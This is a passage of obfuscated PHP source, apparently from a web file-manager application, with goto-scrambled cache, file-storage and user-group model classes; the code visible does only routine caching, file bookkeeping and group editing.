$dÇŠéğÜ›Ê = false) { goto D¦›Â²Êê; D¦›Â²Êê: $EÚ÷Â÷Ñå = self::key($B÷œËÍ¡óô); if (isset(self::$memoryCache[$EÚ÷Â÷Ñå]) && self::$memoryCache[$EÚ÷Â÷Ñå] === $C»’ÊêÔé°) { return !0; } if ($dÇŠéğÜ›Ê === 0) { self::$memoryCache[$EÚ÷Â÷Ñå] = $C»’ÊêÔé°; return !0; } goto f˜ÔÓ×Ã‹†; B˜¿áƒÂ§„: CacheLock::unlock($B÷œËÍ¡óô); return $fœ©ÒÇò–; goto dÊÅ‚éÔÕ; f˜ÔÓ×Ã‹†: CacheLock::lock($B÷œËÍ¡óô); $fœ©ÒÇò– = self::init()->set($EÚ÷Â÷Ñå, serialize($C»’ÊêÔé°), $dÇŠéğÜ›Ê); self::$memoryCache[$EÚ÷Â÷Ñå] = $C»’ÊêÔé°; goto B˜¿áƒÂ§„; dÊÅ‚éÔÕ: } public static function remove($e˜ÓÁÑïŸ¥) { goto EÕ¦¿°Á÷¾; B«¬§Ö†Â”: return $E¾¼°®Á•§; goto fÈäÉã©†Ÿ; EÕ¦¿°Á÷¾: $eÔÎíƒÒ‹™ = self::key($e˜ÓÁÑïŸ¥); unset(self::$memoryCache[$eÔÎíƒÒ‹™]); self::clearTimeout(); goto b¡Ô¾˜‘öÓ; b¡Ô¾˜‘öÓ: CacheLock::lock($e˜ÓÁÑïŸ¥); $E¾¼°®Á•§ = self::init()->remove($eÔÎíƒÒ‹™); CacheLock::unlock($e˜ÓÁÑïŸ¥); goto B«¬§Ö†Â”; fÈäÉã©†Ÿ: } public static function clearMemory($CÏù•–¹¡£ = false) { if ($CÏù•–¹¡£) { $CÏù•–¹¡£ = self::key($CÏù•–¹¡£); unset(self::$memoryCache[$CÏù•–¹¡£]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ì‹É][763])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ì‹É][764])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($a”²…œ‹, $dŞÎœ«âÊ–) { $AˆÈª÷‘ä =& $_SERVER[ì‹É]; $this->cachePath = $a”²…œ‹[$AˆÈª÷‘ä[76]]; $this->prefix = $AˆÈª÷‘ä[765]; $this->cacheTime = $dŞÎœ«âÊ–; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($f…‚çñ†Ï¾) { $BÁÍÆÀ‰‚° =& $_SERVER[ì‹É]; $f…‚çñ†Ï¾ = str_replace(array($BÁÍÆÀ‰‚°[725], $BÁÍÆÀ‰‚°[96], $BÁÍÆÀ‰‚°[70]), $BÁÍÆÀ‰‚°[766], $f…‚çñ†Ï¾); return $this->cachePath . $BÁÍÆÀ‰‚°[767] . $f…‚çñ†Ï¾ . $BÁÍÆÀ‰‚°[768]; } public function set($c»´°±Ñİ, $F”Œ‰÷‹ÉÛ, $A±Ğ‰ãˆ¿‘ = false) { $cŒ§ŒÍÏš÷ = $this->getFile($c»´°±Ñİ); if (file_put_contents($cŒ§ŒÍÏš÷, $this->prefix . $F”Œ‰÷‹ÉÛ, LOCK_EX)) { return !0; } @unlink($cŒ§ŒÍÏš÷); return !1; } public function get($A‘Áœôèåš) { $bŠ©¢·İä = $this->getFile($A‘Áœôèåš); if (file_exists($bŠ©¢·İä) && filemtime($bŠ©¢·İä) < time() - $this->cacheTime) { @unlink($bŠ©¢·İä); return !1; } $b„ÍºÁ„… = @file_get_contents($bŠ©¢·İä); return substr($b„ÍºÁ„…, strlen($this->prefix)); } public function remove($cˆ·ö›½æ§) { $Cë¨‰›«Ò‹ = $this->getFile($cˆ·ö›½æ§); return @unlink($Cë¨‰›«Ò‹); } public function deleteAll() { $dØóÅ¾È˜¢ =& $_SERVER[ì‹É]; $fèÁ•„Şò” = scandir($this->cachePath); foreach ($fèÁ•„Şò” as $AŸ‹¿äì½) { $C¸•¬ØĞ¼ = $this->cachePath . $AŸ‹¿äì½; if (strpos($C¸•¬ØĞ¼, $dØóÅ¾È˜¢[768]) && strpos($C¸•¬ØĞ¼, $dØóÅ¾È˜¢[769])) { @unlink($C¸•¬ØĞ¼); } } } public function clearTimeout() { $f®ô™‡²¾Ã =& $_SERVER[ì‹É]; $EÖ¤†ä„’Š = scandir($this->cachePath); foreach ($EÖ¤†ä„’Š as $eÍØ“çÖ¸) { $bäÅîö„ = $this->cachePath . $eÍØ“çÖ¸; if (strpos($bäÅîö„, $f®ô™‡²¾Ã[768]) && strpos($bäÅîö„, $f®ô™‡²¾Ã[769]) && filemtime($bäÅîö„) < time() - $this->cacheTime) { @unlink($bäÅîö„); } } } } goto cŞ©Ïí†˜; a”´²‚“ç: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\154\x65"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\x61\155\x65" => "\x69\x6f\137\146\151\154\145\137\x6d\x65\164\141", "\155\x65\164\141\x46\151\x65\154\144" => "\146\x69\x6c\x65\x49\x44"); public function fileInfo($E·òóë²Æí) { $EŸöÎ™æó‹ =& $_SERVER[ì‹É]; static $e§ˆ¢ºå² = array(); if (!isset($e§ˆ¢ºå²[$E·òóë²Æí])) { $E‹¨³ËÊ = $EŸöÎ™æó‹[2057]; $eñ¾ìÀÖ«Ô = Model($EŸöÎ™æó‹[418])->field($E‹¨³ËÊ)->where(array($EŸöÎ™æó‹[416] => $E·òóë²Æí))->find(); $e§ˆ¢ºå²[$E·òóë²Æí] = $eñ¾ìÀÖ«Ô; } return $e§ˆ¢ºå²[$E·òóë²Æí]; } public function addFileByContent($Eæá³±ÀìÁ = '', $e“»âˆñˆ¿ = '') { goto Bµã«´ªÂù; Bµã«´ªÂù: $fÒÏ¯ïé· =& $_SERVER[ì‹É]; $A³»³ ¹Ä¶ = TEMP_PATH . $fÒÏ¯ïé·[2058]; if (!is_dir($A³»³ ¹Ä¶)) { mk_dir($A³»³ ¹Ä¶); } goto B°ŠÏ¼¼Å†; B°ŠÏ¼¼Å†: $e¯±‚î™Õ£ = $A³»³ ¹Ä¶ . $fÒÏ¯ïé·[2059] . rand_string(16); file_put_contents($e¯±‚î™Õ£, $Eæá³±ÀìÁ); $D¥çàĞò’³ = $this->addFile($e¯±‚î™Õ£, $e“»âˆñˆ¿, !0); goto eŒØ¸Îóõ®; eŒØ¸Îóõ®: if (file_exists($e¯±‚î™Õ£)) { @unlink($e¯±‚î™Õ£); } return $D¥çàĞò’³; goto F¥Ô—›Óâ; F¥Ô—›Óâ: } public function createFileName($cÃ‘¹®‡‹) { goto díø”Ş…Õ®; a•¬ÂŒº†©: $EµŒ«è›—Ó = $BÊß…¯š¸->pathFather($d´¹„ö§Óº); static $C³ÄÆİôÎ† = false; $aÊ¼óºÄ¼ = $dÀ…ŸŒƒä[2060] . md5($EµŒ«è›—Ó); goto dÀ·¼Ş©‹ä; dÀ·¼Ş©‹ä: if (!$C³ÄÆİôÎ† && !Cache::get($aÊ¼óºÄ¼)) { $C³ÄÆİôÎ† = !0; $E–¦£Ìàà = IO::mkdir($EµŒ«è›—Ó); if (!IO::exist($E–¦£Ìàà . $dÀ…ŸŒƒä[2061])) { IO::mkfile($E–¦£Ìàà . $dÀ…ŸŒƒä[2061]); } Cache::set($aÊ¼óºÄ¼, 1, 3600 * 2); } return $d´¹„ö§Óº; goto F…Ó¼‡Æõ; díø”Ş…Õ®: $dÀ…ŸŒƒä =& $_SERVER[ì‹É]; $BÊß…¯š¸ = IO::init($dÀ…ŸŒƒä[8]); $d´¹„ö§Óº = $this->makeFilePath($cÃ‘¹®‡‹, $BÊß…¯š¸); goto a•¬ÂŒº†©; F…Ó¼‡Æõ: } public function makeFilePath($e‰©çËê©è, $DŸ”ù®È¸) { goto bÚåôŸØ¸²; e‹Ô—¯ˆ”¶: $Dê¼¸£¿–¤ = $C†â¨™Š . rand_string(5) . short_id(100); $e‰©çËê©è = str_replace($FÁ Ïï¢Å™[8], $FÁ Ïï¢Å™[71], KodIO::clear($e‰©çËê©è)); if (!$e‰©çËê©è) { $F“Î©ŸƒÜ = $FÁ Ïï¢Å™[2064]; } goto Eã¯›Æ˜…×; Eã¯›Æ˜…×: switch ($F“Î©ŸƒÜ) { case $FÁ Ïï¢Å™[2065]: $Dê¼¸£¿–¤ = $Dê¼¸£¿–¤ . $FÁ Ïï¢Å™[94] . $DŸ”ù®È¸->ext($e‰©çËê©è); if ($DŸ”ù®È¸->ext($e‰©çËê©è) == $FÁ Ïï¢Å™[2004]) { $Dê¼¸£¿–¤ .= $FÁ Ïï¢Å™[2066]; } break; case $FÁ Ïï¢Å™[2067]: goto D¡Ûç¹Í™Ó; Dòï„Âä™: if ($DŸ”ù®È¸->ext($e‰©çËê©è) == $FÁ Ïï¢Å™[2004]) { $e‰©çËê©è .= $FÁ Ïï¢Å™[2066]; } $dè¢½ÏÀî° = IO::fileNameAuto($C†â¨™Š, $e‰©çËê©è); $Dê¼¸£¿–¤ = $C†â¨™Š . $dè¢½ÏÀî°; goto fÏà±×õÏ‚; fÏà±×õÏ‚: break; goto féµß×¤; D¡Ûç¹Í™Ó: $Eç¾‘´“¸ = Model($FÁ Ïï¢Å™[1061])->get($FÁ Ïï¢Å™[1241]); $bÇ“ĞÖ‹øÚ = substr(md5($FÁ Ïï¢Å™[1825] . $Eç¾‘´“¸ . date($FÁ Ïï¢Å™[674])), 0, 8); $C†â¨™Š = KodIO::defaultIO() . date($FÁ Ïï¢Å™[2068]) . $bÇ“ĞÖ‹øÚ . $FÁ Ïï¢Å™[8]; goto Dòï„Âä™; féµß×¤: case $FÁ Ïï¢Å™[2064]: break; default: break; } return $Dê¼¸£¿–¤; goto Cßìôø¶¼; bÚåôŸØ¸²: $FÁ Ïï¢Å™ =& $_SERVER[ì‹É]; $F“Î©ŸƒÜ = Model($FÁ Ïï¢Å™[1061])->get($FÁ Ïï¢Å™[2062]); $C†â¨™Š = KodIO::defaultIO() . date($FÁ Ïï¢Å™[2063]); goto e‹Ô—¯ˆ”¶; Cßìôø¶¼: } public function addFileByRemote($b—í¥ƒèˆ¡, $e§³Ú®†Ò¦, $bôƒ£…˜Ö = array()) { goto eò®àÊÏ¥; eò®àÊÏ¥: $bİ¨Õº‰š =& $_SERVER[ì‹É]; if (!IO::exist($b—í¥ƒèˆ¡)) { return !1; } $d ¼‹ÔØ¬ = $bôƒ£…˜Ö[$bİ¨Õº‰š[160]] ? $bôƒ£…˜Ö[$bİ¨Õº‰š[160]] : $bİ¨Õº‰š[33]; goto bÉŠ¦‰…”Ü; bÉŠ¦‰…”Ü: $bŠÅ ƒßŒÇ = IO::hashMd5($b—í¥ƒèˆ¡, $d ¼‹ÔØ¬); $aÚØ‹·…¾‡ = KodIO::defaultDriver(); $B“»Œİˆ£¦ = array($bİ¨Õº‰š[512] => IO::size($b—í¥ƒèˆ¡), $bİ¨Õº‰š[2069] => 1, $bİ¨Õº‰š[383] => $e§³Ú®†Ò¦, $bİ¨Õº‰š[741] => $aÚØ‹·…¾‡[$bİ¨Õº‰š[364]], $bİ¨Õº‰š[384] => $b—í¥ƒèˆ¡, $bİ¨Õº‰š[2070] => $bôƒ£…˜Ö[$bİ¨Õº‰š[161]] ? $bôƒ£…˜Ö[$bİ¨Õº‰š[161]] : IO::hashSimple($b—í¥ƒèˆ¡), $bİ¨Õº‰š[2071] => $bŠÅ ƒßŒÇ ? $bŠÅ ƒßŒÇ : $d ¼‹ÔØ¬); goto bŞÏ•‘²—Á; bŞÏ•‘²—Á: if ($EƒîÓ—¥‚‡ = $this->addFileCheckExist($B“»Œİˆ£¦[$bİ¨Õº‰š[161]], $B“»Œİˆ£¦[$bİ¨Õº‰š[160]], $B“»Œİˆ£¦[$bİ¨Õº‰š[78]])) { return $EƒîÓ—¥‚‡; } return $this->addFileData($B“»Œİˆ£¦); goto C‰…Ÿ…Øíø; C‰…Ÿ…Øíø: } private function addFileData($c›Äõ§òÌ) { $C™ñÂÑ¼¦À =& $_SERVER[ì‹É]; if (!$c›Äõ§òÌ) { return !1; } $c›Äõ§òÌ[$C™ñÂÑ¼¦À[78]] = intval($c›Äõ§òÌ[$C™ñÂÑ¼¦À[78]]); if (!$c›Äõ§òÌ[$C™ñÂÑ¼¦À[78]] && strlen($c›Äõ§òÌ[$C™ñÂÑ¼¦À[161]]) > 32) { $c›Äõ§òÌ[$C™ñÂÑ¼¦À[78]] = intval(substr($c›Äõ§òÌ[$C™ñÂÑ¼¦À[161]], 32)); } $d˜œå÷ƒè = $this->add($c›Äõ§òÌ); return $this->find($d˜œå÷ƒè); } public function addFile($bÇ¨Äİˆ, $B¶À†‹±“, $FÙÊõ¹…ß… = false) { $cø¥½ğ÷¸á = IO::hashSimple($bÇ¨Äİˆ); $aÃ²åÀÃÌÈ = IO::hashMd5($bÇ¨Äİˆ); $Dğˆù´ö¥Ô = IO::size($bÇ¨Äİˆ); if ($C’Æ”„÷êª = $this->addFileCheckExist($cø¥½ğ÷¸á, $aÃ²åÀÃÌÈ, $Dğˆù´ö¥Ô)) { return $C’Æ”„÷êª; } $cÉ‘Ÿ’‡Ø½ = $this->addFileMake($bÇ¨Äİˆ, $Dğˆù´ö¥Ô, $cø¥½ğ÷¸á, $aÃ²åÀÃÌÈ, $B¶À†‹±“, $FÙÊõ¹…ß…); return $this->addFileData($cÉ‘Ÿ’‡Ø½); } public function addFileMake($Dó³ùº¡Ùõ, $cÔˆ¸Î„è¢, $d†²©÷”‘º, $eœŠ™»È, $Dç‚°‹†Ü‡, $A¤†·­ÕŞÔ) { goto CÌ—Œ—Åå‹; CÌ—Œ—Åå‹: $FØ¦£ò‘…Ë =& $_SERVER[ì‹É]; $EÍ‡±²ìÖÊ = $this->createFileName($Dç‚°‹†Ü‡); $b÷²Õ„óÊï = get_path_father($EÍ‡±²ìÖÊ); goto a‰ùíëÄ ; a‰ùíëÄ : $c‰¢ÓªÑ’Í = get_path_this($EÍ‡±²ìÖÊ); if ($A¤†·­ÕŞÔ) { $FÃ°Ò¦š = IO::move($Dó³ùº¡Ùõ, $b÷²Õ„óÊï, !1, $c‰¢ÓªÑ’Í); } else { $FÃ°Ò¦š = IO::copy($Dó³ùº¡Ùõ, $b÷²Õ„óÊï, !1, $c‰¢ÓªÑ’Í); } if (!$FÃ°Ò¦š) { return !1; } goto FØÓ•‘ÚñĞ; FØÓ•‘ÚñĞ: $cƒÌŠ©•™Ô = KodIO::defaultDriver(); $d¨ì„Éñ÷Í = array($FØ¦£ò‘…Ë[512] => $cÔˆ¸Î„è¢, $FØ¦£ò‘…Ë[2069] => 1, $FØ¦£ò‘…Ë[383] => $Dç‚°‹†Ü‡, $FØ¦£ò‘…Ë[741] => $cƒÌŠ©•™Ô[$FØ¦£ò‘…Ë[364]], $FØ¦£ò‘…Ë[384] => $EÍ‡±²ìÖÊ, $FØ¦£ò‘…Ë[2070] => $d†²©÷”‘º, $FØ¦£ò‘…Ë[2071] => $eœŠ™»È); return $d¨ì„Éñ÷Í; goto b¬Ñ•…Å‹; b¬Ñ•…Å‹: } public function addFileCheckExist($b¹«œêÑ, $F½çÏÊÍ·“, $aë½Ÿ¶™¬õ) { $cååº³¡ÍÔ =& $_SERVER[ì‹É]; $AØš’ÑÄ â = $this->findByHash($b¹«œêÑ, $F½çÏÊÍ·“); if (!$AØš’ÑÄ â) { return !1; } $FÇÛóÒæø– = array($cååº³¡ÍÔ[2069] => intval($AØš’ÑÄ â[$cååº³¡ÍÔ[2072]]) + 1, $cååº³¡ÍÔ[512] => $aë½Ÿ¶™¬õ); $this->where(array($cååº³¡ÍÔ[416] => $AØš’ÑÄ â[$cååº³¡ÍÔ[415]]))->save($FÇÛóÒæø–); return $AØš’ÑÄ â; } public function remove($eõÚ¹——†Ğ) { $this->linkCountChange($eõÚ¹——†Ğ, !1); $this->clearEmpty(); return !0; } public function linkAdd($B˜¹âÊëÀˆ) { $this->linkCountChange($B˜¹âÊëÀˆ, !0); } public function linkCountChange($F¼é¯ŒÙË, $Dö»ĞöÜÛ¢) { goto b£²ğ¬Â‰Ò; b£²ğ¬Â‰Ò: $fÂšƒºÉø¼ =& $_SERVER[ì‹É]; if (!$F¼é¯ŒÙË) { return; } if (!is_array($F¼é¯ŒÙË)) { $F¼é¯ŒÙË = array($F¼é¯ŒÙË); } goto B¢ËÚİç‰½; B¢ËÚİç‰½: $AŒ·ëƒ“ = array(); foreach ($F¼é¯ŒÙË as $e¬Ş£†ƒã²) { $b•ºÍŠØî¹ = $e¬Ş£†ƒã² . $fÂšƒºÉø¼[33]; if (!$AŒ·ëƒ“[$b•ºÍŠØî¹]) { $AŒ·ëƒ“[$b•ºÍŠØî¹] = 0; } $AŒ·ëƒ“[$b•ºÍŠØî¹]++; } $BÉ’ğÌÙ’Á = array(); goto dÓŞƒğµ¬³; dÓŞƒğµ¬³: foreach ($AŒ·ëƒ“ as $e¬Ş£†ƒã² => $D´Õ„ÙÊÁİ) { $b•ºÍŠØî¹ = $D´Õ„ÙÊÁİ . $fÂšƒºÉø¼[33]; if (!$BÉ’ğÌÙ’Á[$b•ºÍŠØî¹]) { $BÉ’ğÌÙ’Á[$b•ºÍŠØî¹] = array(); } $BÉ’ğÌÙ’Á[$b•ºÍŠØî¹][] = $e¬Ş£†ƒã²; } foreach ($BÉ’ğÌÙ’Á as $D´Õ„ÙÊÁİ => $c·£µÆªÛ) { if (!$c·£µÆªÛ) { continue; } $D´Õ„ÙÊÁİ = $Dö»ĞöÜÛ¢ ? $D´Õ„ÙÊÁİ : -intval($D´Õ„ÙÊÁİ); $d¢çŒÑŒğ = array($fÂšƒºÉø¼[415] => array($fÂšƒºÉø¼[7], $c·£µÆªÛ)); if ($D´Õ„ÙÊÁİ < 0) { $d¢çŒÑŒğ[$fÂšƒºÉø¼[2072]] = array($fÂšƒºÉø¼[926], abs($D´Õ„ÙÊÁİ)); } $this->where($d¢çŒÑŒğ)->setAdd($fÂšƒºÉø¼[2072], $D´Õ„ÙÊÁİ); } goto dèŠŠöƒª“; dèŠŠöƒª“: } public function findByHash($eøê·ÎÂÍé, $Bô•äÎÀøƒ = false) { $EÒì¿§¬Íã =& $_SERVER[ì‹É]; if (!$eøê·ÎÂÍé && !$Bô•äÎÀøƒ) { return !1; } $c‘¾ã…–´À = array($EÒì¿§¬Íã[2070] => $eøê·ÎÂÍé); if ($Bô•äÎÀøƒ) { $c‘¾ã…–´À = array($EÒì¿§¬Íã[2071] => $Bô•äÎÀøƒ); } return $this->order($EÒì¿§¬Íã[2073])->where($c‘¾ã…–´À)->find(); } public function clearEmpty($E‰Â¿öÌõ = 0) { goto a™ˆÁîÉ¿; a™ˆÁîÉ¿: $cÎÌ¾Ş‹ƒõ =& $_SERVER[ì‹É]; $F£™Å‰ƒç = time() - 3600 * 24 * $E‰Â¿öÌõ; $Dİ‚Ÿ†À²à = $cÎÌ¾Ş‹ƒõ[2074] . $F£™Å‰ƒç; goto FÏ­İÍË«¸; aÀƒ÷¤…¶: foreach ($AôŒØæ¬Ûé as $få…‘¯éÊ) { $B®±½‰ŸÎ->update(1); $this->resetFile($få…‘¯éÊ); } $B®±½‰ŸÎ->end(); goto FëØØ¹Õ÷Ğ; FÏ­İÍË«¸: $AôŒØæ¬Ûé = $this->where($Dİ‚Ÿ†À²à)->select(); if (!$AôŒØæ¬Ûé) { return; } $B®±½‰ŸÎ = new Task($cÎÌ¾Ş‹ƒõ[2075], $cÎÌ¾Ş‹ƒõ[33], count($AôŒØæ¬Ûé)); goto aÀƒ÷¤…¶; FëØØ¹Õ÷Ğ: } private function resetFile($EáÛ¿½Øõ«) { goto dØêäÃ¦æ; b¦¹î®ÂÉ: if ($EáÛ¿½Øõ«[$c¢¸‹ äš[2072]] != $B¯¿¼ù¬œ™) { $this->where($AŸìéò„«ø)->save(array($c¢¸‹ äš[2069] => $B¯¿¼ù¬œ™)); } goto F™ÎäŠäÏÙ; dØêäÃ¦æ: $c¢¸‹ äš =& $_SERVER[ì‹É]; $AŸìéò„«ø = array($c¢¸‹ äš[416] => $EáÛ¿½Øõ«[$c¢¸‹ äš[415]]); $d¶¶•ã‚éÉ = Model($c¢¸‹ äš[1083])->where($AŸìéò„«ø)->count(); goto DÒ£²º½ŞÇ; DÒ£²º½ŞÇ: $AÎÜÕ×¢º¡ = Model($c¢¸‹ äš[2076])->where($AŸìéò„«ø)->count(); $B¯¿¼ù¬œ™ = intval($d¶¶•ã‚éÉ) + intval($AÎÜÕ×¢º¡); if ($B¯¿¼ù¬œ™ == 0) { IO::remove($EáÛ¿½Øõ«[$c¢¸‹ äš[76]]); $this->where($AŸìéò„«ø)->delete(); $this->metaSet($EáÛ¿½Øõ«[$c¢¸‹ äš[415]], null, null); return; } goto b¦¹î®ÂÉ; F™ÎäŠäÏÙ: } public function storageInfo($cßÇä¹§à‚ = false) { goto f˜ƒ·İÎøß; d¸íòë¡‚: for ($EÃ‡¦Ó±Ç“ = 0; $EÃ‡¦Ó±Ç“ < $d®ŒºŸß‡; $EÃ‡¦Ó±Ç“ = $EÃ‡¦Ó±Ç“ + $Cµá¦†áõ) { $A“åÌ‡ƒ¨ï = $this->limit($EÃ‡¦Ó±Ç“, $EÃ‡¦Ó±Ç“ + $Cµá¦†áõ)->select(); foreach ($A“åÌ‡ƒ¨ï as $f©æ‡Ä‹Ü™) { $c°Öõ›í² += $f©æ‡Ä‹Ü™[$fŠ„«‚¹[78]] * $f©æ‡Ä‹Ü™[$fŠ„«‚¹[2072]]; $Aã…ÑÅÆˆ += $f©æ‡Ä‹Ü™[$fŠ„«‚¹[78]] * ($f©æ‡Ä‹Ü™[$fŠ„«‚¹[2072]] - 1); $B”Âè¦¹İ += $f©æ‡Ä‹Ü™[$fŠ„«‚¹[2072]]; } } $b„µä×‘Áä = array($fŠ„«‚¹[2077] => $c°Öõ›í², $fŠ„«‚¹[2078] => $Aã…ÑÅÆˆ, $fŠ„«‚¹[2079] => $Aã…ÑÅÆˆ / $c°Öõ›í², $fŠ„«‚¹[82] => $d®ŒºŸß‡, $fŠ„«‚¹[2080] => $B”Âè¦¹İ); return $b„µä×‘Áä; goto fĞ¼¡§; eÂÔÑ«: $c°Öõ›í² = 1; $B”Âè¦¹İ = 0; $Cµá¦†áõ = 5000; goto d¸íòë¡‚; f˜ƒ·İÎøß: $fŠ„«‚¹ =& $_SERVER[ì‹É]; $d®ŒºŸß‡ = $this->count() + 0.0; $Aã…ÑÅÆˆ = 0; goto eÂÔÑ«; fĞ¼¡§: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\x6d\x65" => "\x67\162\157\165\160\137\x6d\x65\x74\x61", "\155\x65\x74\x61\x46\x69\x65\154\144" => "\x67\x72\x6f\x75\160\111\x44"); protected function cacheFunctionAlias($Bœ Ñ©¯) { $Fæñ†Ã»» =& $_SERVER[ì‹É]; return array($Fæñ†Ã»»[2081] => array($Bœ Ñ©¯[0], $Fæñ†Ã»»[2082]), $Fæñ†Ã»»[2083] => array($Bœ Ñ©¯[0], $Fæñ†Ã»»[2082])); } protected function getInfo($f¬ğ«¸¯ßØ) { $F¿ÏÙ¶¨ = $this->getInfoSimple($f¬ğ«¸¯ßØ); if (!$F¿ÏÙ¶¨) { return !1; } return $this->_listDataApplyItem($F¿ÏÙ¶¨); } protected function getInfoSimple($D‘‘°İ˜Ã, $DÜÀ·£µ¹ = false) { $bÇŠ‚ÛèÖí =& $_SERVER[ì‹É]; if ($DÜÀ·£µ¹) { $eƒÌÕ¯¿è = array($bÇŠ‚ÛèÖí[2014] => intval($D‘‘°İ˜Ã)); return $this->where($eƒÌÕ¯¿è)->find(); } return $this->cacheFunctionGet($bÇŠ‚ÛèÖí[2084], $D‘‘°İ˜Ã); } protected function groupAdd($f³¸÷ÍØŒ) { goto cß¶ŒŸğ×‰; BõÉĞ¯•Ñã: if ($C´ˆÇÒ©¸[$aš¹ÀøËëù[455]]) { $E÷…¢æëšñ = $C´ˆÇÒ©¸[$aš¹ÀøËëù[455]] . $C´ˆÇÒ©¸[$aš¹ÀøËëù[2014]] . $aš¹ÀøËëù[47]; } $cÔÚĞí¬Ãë = array($aš¹ÀøËëù[383] => $this->groupNameAuto($f³¸÷ÍØŒ[$aš¹ÀøËëù[457]], $f³¸÷ÍØŒ[$aš¹ÀøËëù[28]]), $aš¹ÀøËëù[365] => $f³¸÷ÍØŒ[$aš¹ÀøËëù[457]], $aš¹ÀøËëù[517] => $E÷…¢æëšñ, $aš¹ÀøËëù[2086] => $f³¸÷ÍØŒ[$aš¹ÀøËëù[1998]], $aš¹ÀøËëù[2087] => 0, $aš¹ÀøËëù[2018] => 0); if (!empty($f³¸÷ÍØŒ[$aš¹ÀøËëù[2014]])) { $cÔÚĞí¬Ãë[$aš¹ÀøËëù[2014]] = $f³¸÷ÍØŒ[$aš¹ÀøËëù[2014]]; } goto d½îİ§ì®«; cß¶ŒŸğ×‰: $aš¹ÀøËëù =& $_SERVER[ì‹É]; if (!$f³¸÷ÍØŒ[$aš¹ÀøËëù[457]] && isset($f³¸÷ÍØŒ[$aš¹ÀøËëù[2014]]) && $f³¸÷ÍØŒ[$aš¹ÀøËëù[2014]] == 1) { if ($C´ˆÇÒ©¸ = $this->getInfoSimple($f³¸÷ÍØŒ[$aš¹ÀøËëù[2014]], !0)) { return $f³¸÷ÍØŒ[$aš¹ÀøËëù[2014]]; } } else { $C´ˆÇÒ©¸ = $this->getInfoSimple($f³¸÷ÍØŒ[$aš¹ÀøËëù[457]]); if (!$C´ˆÇÒ©¸) { return !1; } } $E÷…¢æëšñ = $aš¹ÀøËëù[2085]; goto BõÉĞ¯•Ñã; a¦ÏÀ®“´¸: return $BÕ¸¢™ÚŸ; goto e²ˆªÇä¤œ; d½îİ§ì®«: $BÕ¸¢™ÚŸ = $this->add($cÔÚĞí¬Ãë); $this->setNamePinyin($BÕ¸¢™ÚŸ, $cÔÚĞí¬Ãë[$aš¹ÀøËëù[28]]); Model($aš¹ÀøËëù[1083])->groupRootAdd($BÕ¸¢™ÚŸ); goto a¦ÏÀ®“´¸; e²ˆªÇä¤œ: } protected function groupEdit($a¤½ö´£¡Ñ, $d§¡·íç¨é) { $C¤ÜÍ…ò¡ =& $_SERVER[ì‹É]; if (!empty($d§¡·íç¨é[$C¤ÜÍ…ò¡[457]])) { $AîÊÆœ¨‚ = $this->getInfoSimple($a¤½ö´£¡Ñ); $D¿’Şòšƒ¤ = $this->getInfoSimple($d§¡·íç¨é[$C¤ÜÍ…ò¡[457]]); if (!$AîÊÆœ¨‚ || !$D¿’Şòšƒ¤) { return !1; } if ($AîÊÆœ¨‚[$C¤ÜÍ…ò¡[2014]] == $D¿’Şòšƒ¤[$C¤ÜÍ…ò¡[2014]]) { return !1; } if ($d§¡·íç¨é[$C¤ÜÍ…ò¡[457]] != $AîÊÆœ¨‚[$C¤ÜÍ…ò¡[457]]) { if ($D¿’Şòšƒ¤[$C¤ÜÍ…ò¡[455]] !== $AîÊÆœ¨‚[$C¤ÜÍ…ò¡[455]] && strpos($D¿’Şòšƒ¤[$C¤ÜÍ…ò¡[455]], $AîÊÆœ¨‚[$C¤ÜÍ…ò¡[455]] . $AîÊÆœ¨‚[$C¤ÜÍ…ò¡[2014]] . $C¤ÜÍ…ò¡[47]) === 0) { return !1; } $d§¡·íç¨é[$C¤ÜÍ…ò¡[517]] = $D¿’Şòšƒ¤[$C¤ÜÍ…ò¡[455]] . $d§¡·íç¨é[$C¤ÜÍ…ò¡[457]] . $C¤ÜÍ…ò¡[47]; $this->_changeChildLevel($AîÊÆœ¨‚, $D¿’Şòšƒ¤); } } if (isset($d§¡·íç¨é[$C¤ÜÍ…ò¡[28]])) { $this->setNamePinyin($a¤½ö´£¡Ñ, $d§¡·íç¨é[$C¤ÜÍ…ò¡[28]]); } return $this->where(array($C¤ÜÍ…ò¡[2088] => $a¤½ö´£¡Ñ))->save($d§¡·íç¨é); } private function _changeChildLevel($E›—Áªˆ, $b‘İñˆõ¥, $c…àÅšÄàğ = false) { goto fßø‡íç¡; eÈùç»Õ¼ô: if ($c…àÅšÄàğ) { $BÑ‡îÊáí = $b‘İñˆõ¥[$dÄ¡¿Èõ¼©[455]] . $b‘İñˆõ¥[$dÄ¡¿Èõ¼©[2014]] . $dÄ¡¿Èõ¼©[47]; } $EÁ–æƒˆµÚ = array($dÄ¡¿Èõ¼©[517] => array($dÄ¡¿Èõ¼©[475], $E›—Áªˆ[$dÄ¡¿Èõ¼©[455]] . $E›—Áªˆ[$dÄ¡¿Èõ¼©[2014]] . $dÄ¡¿Èõ¼©[476])); $Cä“Î›‰ø = array($dÄ¡¿Èõ¼©[517] => array($dÄ¡¿Èõ¼©[526], "\x72\x65\x70\x6c\141\x63\x65\50\160\141\x72\x65\x6e\x74\114\145\x76\x65\154\54\x27{$E‡†¨Îã¶ö}\x27\54\x27{$BÑ‡îÊáí}\47\51")); goto E¬‡‚§¦™; E¬‡‚§¦™: $this->where($EÁ–æƒˆµÚ)->data($Cä“Î›‰ø)->save(); goto B­©Ù«»Û; fßø‡íç¡: $dÄ¡¿Èõ¼© =& $_SERVER[ì‹É]; $E‡†¨Îã¶ö = $E›—Áªˆ[$dÄ¡¿Èõ¼©[455]] . $E›—Áªˆ[$dÄ¡¿Èõ¼©[2014]] . $dÄ¡¿Èõ¼©[47]; $BÑ‡îÊáí = $b‘İñˆõ¥[$dÄ¡¿Èõ¼©[455]] . $b‘İñˆõ¥[$dÄ¡¿Èõ¼©[2014]] . $dÄ¡¿Èõ¼©[47] . 